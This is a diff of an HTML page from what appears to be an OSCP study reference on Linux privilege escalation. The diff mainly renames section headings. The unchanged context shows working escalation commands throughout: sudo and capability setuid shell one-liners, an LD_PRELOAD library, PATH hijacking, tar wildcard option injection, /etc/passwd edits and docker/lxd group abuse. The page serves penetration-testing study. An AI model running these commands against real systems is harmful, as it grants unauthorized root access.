@@ -1,18 +1,18 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="noindex"><title>Linux escalation · Reference prototype</title><link rel="stylesheet" href="/_assets/linux.CqGh4SMk.css"></head><body><a class="skip" href="#document">Skip to tasks</a><header class="reference-header"><a href="/oscp/" class="brand">OSCP Reference</a><div class="reference-find"><form id="reference-search" role="search"><label for="reference-query" class="sr-only">Search the reference</label><input id="reference-query" type="search" maxlength="160" placeholder="Search a task, command or error…" autocomplete="off"><button>Find</button></form><div class="search-feedback" hidden><p id="reference-search-status" role="status" aria-live="polite"></p><ol id="reference-results" hidden></ol></div></div><a class="compare" href="/oscp/cheatsheets/linux-privesc/">Compare original ↗</a></header><aside id="reference-index"><p class="eyebrow">WORKFLOW</p><nav aria-label="Reference index"><a href="/oscp/cheatsheets/discovery-scanning/">Discovery</a><a href="/oscp/cheatsheets/service-opportunities/">Services</a><a href="/oscp/cheatsheets/web-mapping/">Web</a><a href="/oscp/cheatsheets/credentials-cracking/">Credentials</a><a href="/oscp/cheatsheets/shells-payloads/">Shells &amp; transfers</a><a href="#document" aria-current="page">Linux escalation</a><a href="/oscp/cheatsheets/windows-privesc/">Windows escalation</a><a href="/oscp/cheatsheets/ad-investigation/">Active Directory</a><a href="/oscp/cheatsheets/pivoting/">Pivoting</a><a href="/oscp/cheatsheets/evidence-reporting/">Evidence</a></nav><div class="library"><a href="/oscp/">Browse full library ↗</a><p>Procedures, study notes<br>and numbered sections.</p></div></aside><main id="document" tabindex="-1"><p class="eyebrow">PROTOTYPE · LOCAL PRIVILEGE ESCALATION</p><h1>Linux privilege escalation</h1><p class="lede">Find a promising permission or credential, validate its conditions, then verify the resulting identity.</p><section class="start"><div><strong>Starting with a shell?</strong><p>Establish your identity and host context. Then follow the evidence you find.</p><a href="#first-pass">Start the first pass →</a></div><div><strong>Already have a finding?</strong><p>Open its task below. Read the baseline with its interpretation; expand alternatives when needed.</p><a href="#sudo">Inspect a sudo finding →</a></div></section><div class="task-heading"><h2>Choose an investigation</h2><span>Open only what you need</span></div><article><a id="s-10-6"></a><a id="s-10-9" data-legacy-anchor="s-10-6"></a><h1 id="linux-privilege-escalation-cheatsheet">10.9 Linux Privilege Escalation Cheatsheet</h1>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="noindex"><title>Linux escalation · Reference prototype</title><link rel="stylesheet" href="/_assets/linux.DeG28r4V.css"></head><body><a class="skip" href="#document">Skip to tasks</a><header class="reference-header"><a href="/oscp/" class="brand">OSCP Reference</a><div class="reference-find"><form id="reference-search" role="search"><label for="reference-query" class="sr-only">Search the reference</label><input id="reference-query" type="search" maxlength="160" placeholder="Search a task, command or error…" autocomplete="off"><button>Find</button></form><div class="search-feedback" hidden><p id="reference-search-status" role="status" aria-live="polite"></p><ol id="reference-results" hidden></ol></div></div><a class="compare" href="/oscp/cheatsheets/linux-privesc/">Compare original ↗</a></header><aside id="reference-index"><p class="eyebrow">WORKFLOW</p><nav aria-label="Reference index"><a href="/oscp/cheatsheets/discovery-scanning/">Discovery</a><a href="/oscp/cheatsheets/service-opportunities/">Services</a><a href="/oscp/cheatsheets/web-mapping/">Web</a><a href="/oscp/cheatsheets/credentials-cracking/">Credentials</a><a href="/oscp/cheatsheets/shells-payloads/">Shells &amp; transfers</a><a href="#document" aria-current="page">Linux escalation</a><a href="/oscp/cheatsheets/windows-privesc/">Windows escalation</a><a href="/oscp/cheatsheets/ad-investigation/">Active Directory</a><a href="/oscp/cheatsheets/pivoting/">Pivoting</a><a href="/oscp/cheatsheets/evidence-reporting/">Evidence</a></nav><div class="library"><a href="/oscp/">Browse full library ↗</a><p>Procedures, study notes<br>and numbered sections.</p></div></aside><main id="document" tabindex="-1"><p class="eyebrow">PROTOTYPE · LOCAL PRIVILEGE ESCALATION</p><h1>Linux privilege escalation</h1><p class="lede">Find a promising permission or credential, validate its conditions, then verify the resulting identity.</p><section class="start"><div><strong>Starting with a shell?</strong><p>Establish your identity and host context. Then follow the evidence you find.</p><a href="#first-pass">Start the first pass →</a></div><div><strong>Already have a finding?</strong><p>Open its task below. Read the baseline with its interpretation; expand alternatives when needed.</p><a href="#sudo">Inspect a sudo finding →</a></div></section><div class="task-heading"><h2>Choose an investigation</h2><span>Open only what you need</span></div><article><a id="s-10-6"></a><a id="s-10-9" data-legacy-anchor="s-10-6"></a><h1 id="linux-privilege-escalation-cheatsheet">10.9 Linux Privilege Escalation Cheatsheet</h1>
 <p><a href="/oscp/cheatsheets/">← Cheatsheet index</a> | <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Full procedure</a> | <a href="/oscp/notes/Master_Notes/#linux-selection-logic">Master Notes</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></p>
-<a id="s-10-6-1"></a><a id="s-10-9-1" data-legacy-anchor="s-10-6-1"></a><h2 id="early-tool-assisted-pass">10.9.1 Early tool-assisted pass</h2>
+<a id="s-10-6-1"></a><a id="s-10-9-1" data-legacy-anchor="s-10-6-1"></a><h2 id="early-tool-assisted-pass">10.9.1 Find escalation candidates with an initial tool-assisted survey <span class="method-label">Early tool-assisted pass</span></h2>
 <p>Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity.</p>
 <pre><code class="language-bash">id
 uname -m
 sh ./linpeas.sh | tee linpeas.txt
 </code></pre>
 <p><a href="/oscp/notes/methods/linux-privesc/#first-pass-tools-and-findings">Tool-to-finding workflow</a>.</p>
-<a id="s-10-6-2"></a><a id="s-10-9-2" data-legacy-anchor="s-10-6-2"></a><h2 id="candidate-proof">10.9.2 Candidate proof</h2>
+<a id="s-10-6-2"></a><a id="s-10-9-2" data-legacy-anchor="s-10-6-2"></a><h2 id="candidate-proof">10.9.2 Verify the conditions that make an escalation path usable <span class="method-label">Candidate proof</span></h2>
 <div class="command-pair"><div class="command-action"><pre><code class="language-text">controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Do not exploit an automated highlight until every link is supported. Prioritize credentials/sudo, writable root consumers and SUID/capabilities before software/kernel exploits.</p>
 </blockquote></div></div>
-<a id="s-10-6-3"></a><a id="s-10-9-3" data-legacy-anchor="s-10-6-3"></a><h2 id="first-pass">10.9.3 First pass</h2>
+<a id="s-10-6-3"></a><a id="s-10-9-3" data-legacy-anchor="s-10-6-3"></a><h2 id="first-pass">10.9.3 Find promising paths from your current access <span class="method-label">First pass</span></h2>
 <pre><code class="language-bash">hostname; id; groups
 uname -a; cat /etc/os-release; getconf LONG_BIT
 pwd; umask; env
@@ -25,7 +25,7 @@ sudo -l
 <pre><code class="language-bash">getent passwd
 awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd
 </code></pre>
-<a id="s-10-6-4"></a><a id="s-10-9-4" data-legacy-anchor="s-10-6-4"></a><h2 id="prove-effective-permissions">10.9.4 Prove effective permissions</h2>
+<a id="s-10-6-4"></a><a id="s-10-9-4" data-legacy-anchor="s-10-6-4"></a><h2 id="prove-effective-permissions">10.9.4 Verify your effective access to the resource the attack depends on <span class="method-label">Prove effective permissions</span></h2>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">namei -l /PATH/TO/OBJECT
 stat /PATH/TO/OBJECT /PATH/TO/PARENT
 getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
@@ -35,7 +35,7 @@ find / -xdev -type d -writable -ls 2>/dev/null
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Parent write+execute may permit replacement. ACLs can override the mode-bit impression. <code>nosuid</code> blocks SUID/SGID/file capabilities; <code>noexec</code> blocks direct execution; <code>ro</code> blocks changes.</p>
 </blockquote></div></div>
-<a id="s-10-6-5"></a><a id="s-10-9-5" data-legacy-anchor="s-10-6-5"></a><h2 id="credentials-and-files">10.9.5 Credentials and files</h2>
+<a id="s-10-6-5"></a><a id="s-10-9-5" data-legacy-anchor="s-10-6-5"></a><h2 id="credentials-and-files">10.9.5 Find credentials you can use for another identity <span class="method-label">Credentials and files</span></h2>
 <pre><code class="language-bash">history 2>/dev/null
 find /home /root -maxdepth 3 -type f \
   \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
@@ -55,7 +55,7 @@ screen -ls 2>/dev/null
 find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Record user/service context before <code>su</code>, <code>sudo</code>, SSH or application validation. <code>/proc</code> access and short process lifetime can hide values. Session/agent sockets require effective access and a useful live identity.</p>
-</blockquote></div></div><details data-method-fold><summary><h2 id="sudo">10.9.6 Sudo</h2><span class="method-choice-cue">Inspect the allowed run-as identity, exact command, arguments and restrictions before selecting a sudo path.</span></summary>
+</blockquote></div></div><details data-method-fold><summary><h2 id="sudo">10.9.6 Check whether your sudo rights enable higher privileges <span class="method-label">Sudo</span></h2><span class="method-choice-cue">Inspect the allowed run-as identity, exact command, arguments and restrictions before selecting a sudo path.</span></summary>
 <a id="s-10-6-6"></a><a id="s-10-9-6" data-legacy-anchor="s-10-6-6"></a>
 <pre><code class="language-bash">sudo -n -l 2>&#x26;1
 sudo -l
@@ -69,7 +69,7 @@ sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")
 <p>Match exact rule and mode in <a href="https://gtfobins.github.io/">GTFOBins</a>. A binary name alone is insufficient.</p>
 </blockquote></div></div>
 <details>
-<summary id="variant-10-6-6-1">10.9.6.1 LD_PRELOAD only when allowed/preserved</summary>
+<summary id="variant-10-6-6-1">10.9.6.1 Check whether sudo preserves a controlled preload library <span class="method-label">LD_PRELOAD only when allowed/preserved</span></summary>
 <pre><code class="language-bash">sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
 </code></pre>
 <pre><code class="language-c">#include &#x3C;stdlib.h>
@@ -83,7 +83,7 @@ void _init(void) {
 <pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
 </code></pre>
-</details></details><details data-method-fold><summary><h2 id="suid--sgid--capabilities">10.9.7 SUID / SGID / capabilities</h2><span class="method-choice-cue">A privileged executable or capability is a candidate; verify its exact operation and execution context.</span></summary>
+</details></details><details data-method-fold><summary><h2 id="suid--sgid--capabilities">10.9.7 Find privileged executables you can use <span class="method-label">SUID / SGID / capabilities</span></h2><span class="method-choice-cue">A privileged executable or capability is a candidate; verify its exact operation and execution context.</span></summary>
 <a id="s-10-6-7"></a><a id="s-10-9-7" data-legacy-anchor="s-10-6-7"></a>
 <pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
 find / -xdev -type f -perm -2000 -ls 2>/dev/null
@@ -107,7 +107,7 @@ grep '^Cap' /proc/self/status
 /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Last command requires effective <code>cap_setuid</code> on that exact interpreter. Check bounding set, namespace, mount and privilege retention.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="cron-timers-services-and-short-lived-processes">10.9.8 Cron, timers, services and short-lived processes</h2><span class="method-choice-cue">Check the privileged consumer, controlled input and actual schedule or trigger.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="cron-timers-services-and-short-lived-processes">10.9.8 Find privileged execution that consumes something you control <span class="method-label">Cron, timers, services and short-lived processes</span></h2><span class="method-choice-cue">Check the privileged consumer, controlled input and actual schedule or trigger.</span></summary>
 <a id="s-10-6-8"></a><a id="s-10-9-8" data-legacy-anchor="s-10-6-8"></a>
 <pre><code class="language-bash">crontab -l 2>/dev/null
 cat /etc/crontab
@@ -130,7 +130,7 @@ getfacl -p /PATH/TO/SCRIPT /PATH/TO/PARENT 2>/dev/null
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Need controllable referenced object + higher run identity + schedule/restart trigger. Cron environment differs from the interactive shell; writable service config still needs reload/restart.</p>
 </blockquote></div></div>
-<p>Use the same chain for backup, logrotate, package-maintenance and custom housekeeping hooks.</p></details><details data-method-fold><summary><h2 id="path-hijacking">10.9.9 PATH hijacking</h2><span class="method-choice-cue">Prove the privileged consumer uses the controlled name, expansion or search path.</span></summary>
+<p>Use the same chain for backup, logrotate, package-maintenance and custom housekeeping hooks.</p></details><details data-method-fold><summary><h2 id="path-hijacking">10.9.9 Check whether you can redirect a privileged command lookup <span class="method-label">PATH hijacking</span></h2><span class="method-choice-cue">Prove the privileged consumer uses the controlled name, expansion or search path.</span></summary>
 <a id="s-10-6-9"></a><a id="s-10-9-9" data-legacy-anchor="s-10-6-9"></a>
 <pre><code class="language-bash">echo "$PATH" | tr ':' '\n'
 echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do
@@ -145,7 +145,7 @@ PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER
 cat /tmp/path-proof
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Need relative command + consumer's effective PATH + earlier writable directory + privileged trigger.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="wildcard-option-injection">10.9.10 Wildcard option injection</h2><span class="method-choice-cue">Prove the privileged consumer uses the controlled name, expansion or search path.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="wildcard-option-injection">10.9.10 Check whether controlled filenames become privileged command options <span class="method-label">Wildcard option injection</span></h2><span class="method-choice-cue">Prove the privileged consumer uses the controlled name, expansion or search path.</span></summary>
 <a id="s-10-6-10"></a><a id="s-10-9-10" data-legacy-anchor="s-10-6-10"></a>
 <pre><code class="language-bash">grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \
   /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null
@@ -157,7 +157,7 @@ touch -- '--checkpoint=1'
 touch -- '--checkpoint-action=exec=sh proof.sh'
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Confirm expansion, option support/order, utility implementation, identity and trigger.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="writable-account-and-policy-files">10.9.11 Writable account and policy files</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="writable-account-and-policy-files">10.9.11 Check whether writable account or policy files enable higher privileges <span class="method-label">Writable account and policy files</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
 <a id="s-10-6-11"></a><a id="s-10-9-11" data-legacy-anchor="s-10-6-11"></a>
 <pre><code class="language-bash">ls -l /etc/passwd /etc/shadow /etc/sudoers
 namei -l /etc/passwd
@@ -173,7 +173,7 @@ id
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Preserve/restore the original. Avoid direct change without a recovery path.</p>
 </blockquote></div></div>
-</details></details><details data-method-fold><summary><h2 id="groups-sockets-and-containers">10.9.12 Groups, sockets and containers</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</details></details><details data-method-fold><summary><h2 id="groups-sockets-and-containers">10.9.12 Check whether group or socket access gives you higher privileges <span class="method-label">Groups, sockets and containers</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
 <a id="s-10-6-12"></a><a id="s-10-9-12" data-legacy-anchor="s-10-6-12"></a>
 <pre><code class="language-bash">id
 ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
@@ -188,7 +188,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Docker/LXD need actual daemon rights and suitable configuration/image. Also investigate <code>disk</code>, <code>shadow</code>, <code>adm</code>, <code>systemd-journal</code> and <code>libvirt</code> by the resource they expose.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="mounts-nfs-local-services-and-libraries">10.9.13 Mounts, NFS, local services and libraries</h2><span class="method-choice-cue">Verify the selected service identity, effective control and required trigger; reachability alone is insufficient.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="mounts-nfs-local-services-and-libraries">10.9.13 Find escalation paths through mounts and local services <span class="method-label">Mounts, NFS, local services and libraries</span></h2><span class="method-choice-cue">Verify the selected service identity, effective control and required trigger; reachability alone is insufficient.</span></summary>
 <a id="s-10-6-13"></a><a id="s-10-9-13" data-legacy-anchor="s-10-6-13"></a>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">findmnt
 cat /etc/fstab
@@ -208,7 +208,7 @@ ldd /PATH/TO/BINARY 2>/dev/null
 /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
 </code></pre></div><div class="command-reading"><blockquote>
 <p>For interpreter/module hijacking, prove the privileged script's actual import/include search order; an interactive search path may differ.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="softwarekernel-candidates--last">10.9.14 Software/kernel candidates — last</h2><span class="method-choice-cue">Use a matching affected build/configuration only after stronger permission-backed candidates have been assessed.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="softwarekernel-candidates--last">10.9.14 Assess matching software or kernel exploits after permission checks <span class="method-label">Software/kernel candidates — last</span></h2><span class="method-choice-cue">Use a matching affected build/configuration only after stronger permission-backed candidates have been assessed.</span></summary>
 <a id="s-10-6-14"></a><a id="s-10-9-14" data-legacy-anchor="s-10-6-14"></a>
 <pre><code class="language-bash">uname -a
 cat /proc/version
@@ -228,7 +228,7 @@ sha256sum exploit
 </code></pre></div><div class="command-reading"><blockquote>
 <p>Match exact build/backports, architecture, configuration, namespace/capability, mitigations and dependencies. Review source and crash/recovery risk.</p>
 </blockquote></div></div></details>
-<a id="s-10-6-15"></a><a id="s-10-9-15" data-legacy-anchor="s-10-6-15"></a><h2 id="automated-candidate-generation">10.9.15 Automated candidate generation</h2>
+<a id="s-10-6-15"></a><a id="s-10-9-15" data-legacy-anchor="s-10-6-15"></a><h2 id="automated-candidate-generation">10.9.15 Investigate remaining gaps with a focused automated survey <span class="method-label">Automated candidate generation</span></h2>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">./linpeas.sh | tee linpeas.txt
 ./lse.sh | tee lse.txt
 ./lse.sh -l1 | tee lse-l1.txt
@@ -236,7 +236,7 @@ sha256sum exploit
 </code></pre></div><div class="command-reading"><blockquote>
 <p>LinPEAS <code>-a</code> is slower/noisier and adds password attempts/process monitoring; use only when justified. LSE <code>-l2</code> and <code>unix-privesc-check detailed</code> are later depth, not baseline. Transfer a trusted copy and record its hash instead of piping an unverified download to <code>sh</code>.</p>
 </blockquote></div></div>
-<a id="s-10-6-16"></a><a id="s-10-9-16" data-legacy-anchor="s-10-6-16"></a><h2 id="failure-quick-map">10.9.16 Failure quick map</h2>
+<a id="s-10-6-16"></a><a id="s-10-9-16" data-legacy-anchor="s-10-6-16"></a><h2 id="failure-quick-map">10.9.16 Choose the next check from the failure you observed <span class="method-label">Failure quick map</span></h2>
 
 
 
@@ -506,4 +506,4 @@ ls -ld /tmp
 <p><strong>Validate next:</strong> Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-enumerators">Use enumeration tools to generate manually testable candidates</a>.</p>
-</details></article><section class="deeper"><strong>Understand the mechanism</strong><p><a href="/oscp/notes/methods/linux-privesc/">Study methods</a> · <a href="/oscp/reference/05-local-privilege-escalation/">Complete procedures</a> · <a href="/oscp/notes/Master_Notes/">Master Notes</a></p></section></main><aside id="page-index"><p class="eyebrow">IN THIS TOPIC</p><nav aria-label="On this page"><a href="#early-tool-assisted-pass">1 Early tool-assisted pass</a><a href="#candidate-proof">2 Candidate proof</a><a href="#first-pass">3 First pass</a><a href="#prove-effective-permissions">4 Prove effective permissions</a><a href="#credentials-and-files">5 Credentials and files</a><a href="#sudo">6 Sudo</a><a href="#suid--sgid--capabilities">7 SUID / SGID / capabilities</a><a href="#cron-timers-services-and-short-lived-processes">8 Cron, timers, services and short-lived processes</a><a href="#path-hijacking">9 PATH hijacking</a><a href="#wildcard-option-injection">10 Wildcard option injection</a><a href="#writable-account-and-policy-files">11 Writable account and policy files</a><a href="#groups-sockets-and-containers">12 Groups, sockets and containers</a><a href="#mounts-nfs-local-services-and-libraries">13 Mounts, NFS, local services and libraries</a><a href="#softwarekernel-candidates--last">14 Software/kernel candidates — last</a><a href="#automated-candidate-generation">15 Automated candidate generation</a><a href="#failure-quick-map">16 Failure quick map</a><a href="#verify-and-re-enumerate">17 Verify and re-enumerate</a><a href="#discover-and-recognize-candidates">18 Discover and recognize candidates</a></nav></aside></body></html><script type="module" src="/_assets/linux.astro_astro_type_script_index_0_lang.CNHjfRVt.js"></script>
+</details></article><section class="deeper"><strong>Understand the mechanism</strong><p><a href="/oscp/notes/methods/linux-privesc/">Study methods</a> · <a href="/oscp/reference/05-local-privilege-escalation/">Complete procedures</a> · <a href="/oscp/notes/Master_Notes/">Master Notes</a></p></section></main><aside id="page-index"><p class="eyebrow">IN THIS TOPIC</p><nav aria-label="On this page"><a href="#early-tool-assisted-pass">1 Find escalation candidates with an initial tool-assisted survey</a><a href="#candidate-proof">2 Verify the conditions that make an escalation path usable</a><a href="#first-pass">3 Find promising paths from your current access</a><a href="#prove-effective-permissions">4 Verify your effective access to the resource the attack depends on</a><a href="#credentials-and-files">5 Find credentials you can use for another identity</a><a href="#sudo">6 Check whether your sudo rights enable higher privileges</a><a href="#suid--sgid--capabilities">7 Find privileged executables you can use</a><a href="#cron-timers-services-and-short-lived-processes">8 Find privileged execution that consumes something you control</a><a href="#path-hijacking">9 Check whether you can redirect a privileged command lookup</a><a href="#wildcard-option-injection">10 Check whether controlled filenames become privileged command options</a><a href="#writable-account-and-policy-files">11 Check whether writable account or policy files enable higher privileges</a><a href="#groups-sockets-and-containers">12 Check whether group or socket access gives you higher privileges</a><a href="#mounts-nfs-local-services-and-libraries">13 Find escalation paths through mounts and local services</a><a href="#softwarekernel-candidates--last">14 Assess matching software or kernel exploits after permission checks</a><a href="#automated-candidate-generation">15 Investigate remaining gaps with a focused automated survey</a><a href="#failure-quick-map">16 Choose the next check from the failure you observed</a><a href="#verify-and-re-enumerate">17 Verify and re-enumerate</a><a href="#discover-and-recognize-candidates">18 Discover and recognize candidates</a></nav></aside></body></html><script type="module" src="/_assets/linux.astro_astro_type_script_index_0_lang.CNHjfRVt.js"></script>
